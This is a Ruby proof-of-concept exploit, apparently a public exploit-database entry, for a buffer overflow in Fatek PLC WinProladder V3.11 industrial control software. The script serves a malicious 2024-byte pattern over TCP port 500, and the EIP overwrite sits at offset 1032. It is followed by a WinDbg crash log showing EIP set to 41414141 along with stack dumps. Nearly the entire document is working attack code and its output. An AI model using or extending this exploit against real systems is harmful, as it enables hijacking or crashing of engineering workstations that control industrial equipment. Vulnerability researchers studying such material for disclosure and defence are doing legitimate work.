#!/usr/bin/env ruby 
# Fatek PLC WinProladder V3.11 Build:14701 Buffer Overflow
require 'rex'
  
sploit = Rex::Text.pattern_create(2024)
sploit[1032, 4] = [0x41414141].pack('V')

server = TCPServer.new 500 

loop do
  client = server.accept
  select(nil,nil,nil,0.5) 
  client.write(sploit + "\r\n")
end
__END__
(9b8.2f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012f801 ebx=33694232 ecx=0012f0c8 edx=0012f51c esi=69423169 edi=0012f5cc
eip=41414141 esp=0012f4e4 ebp=0012f4f0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
0:000> d esp
0012f4e4  69 35 42 69 36 42 69 37-42 69 38 42 69 39 42 6a  i5Bi6Bi7Bi8Bi9Bj
0012f4f4  30 42 6a 31 42 6a 32 42-6a 33 42 6a 34 42 6a 35  0Bj1Bj2Bj3Bj4Bj5
0012f504  42 6a 36 42 6a 37 42 6a-38 42 6a 39 42 6b 30 42  Bj6Bj7Bj8Bj9Bk0B
0012f514  6b 31 42 6b 32 42 6b 33-42 6b 34 42 6b 35 42 6b  k1Bk2Bk3Bk4Bk5Bk
0012f524  36 42 6b 37 42 6b 38 42-6b 39 42 6c 30 42 6c 31  6Bk7Bk8Bk9Bl0Bl1
0012f534  42 6c 32 42 6c 33 42 6c-34 42 6c 35 42 6c 36 42  Bl2Bl3Bl4Bl5Bl6B
0012f544  6c 37 42 6c 38 42 6c 39-42 6d 30 42 6d 31 42 6d  l7Bl8Bl9Bm0Bm1Bm
0012f554  32 42 6d 33 42 6d 34 42-6d 35 42 6d 36 42 6d 37  2Bm3Bm4Bm5Bm6Bm7
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
0012f4e0 69423569 37694236 42386942 6a423969 0x41414141
0012f4f0 316a4230 42326a42 6a42336a 356a4234 0x69423569
0012f4f4 42326a42 6a42336a 356a4234 42366a42 0x316a4230
0012f4f8 6a42336a 356a4234 42366a42 6a42376a 0x42326a42
0012f4fc 356a4234 42366a42 6a42376a 396a4238 0x6a42336a
0012f500 42366a42 6a42376a 396a4238 42306b42 0x356a4234
0012f504 6a42376a 396a4238 42306b42 6b42316b 0x42366a42
0012f508 396a4238 42306b42 6b42316b 336b4232 0x6a42376a
0012f50c 42306b42 6b42316b 336b4232 42346b42 0x396a4238
0012f510 6b42316b 336b4232 42346b42 6b42356b 0x42306b42
0012f514 336b4232 42346b42 6b42356b 376b4236 0x6b42316b
0012f518 42346b42 6b42356b 376b4236 42386b42 0x336b4232
0012f51c 6b42356b 376b4236 42386b42 6c42396b 0x42346b42
0012f520 376b4236 42386b42 6c42396b 316c4230 0x6b42356b
0012f524 42386b42 6c42396b 316c4230 42326c42 0x376b4236
0012f528 6c42396b 316c4230 42326c42 6c42336c 0x42386b42
0012f52c 316c4230 42326c42 6c42336c 356c4234 0x6c42396b
0012f530 42326c42 6c42336c 356c4234 42366c42 0x316c4230
0012f534 6c42336c 356c4234 42366c42 6c42376c 0x42326c42
0012f538 356c4234 42366c42 6c42376c 396c4238 0x6c42336c

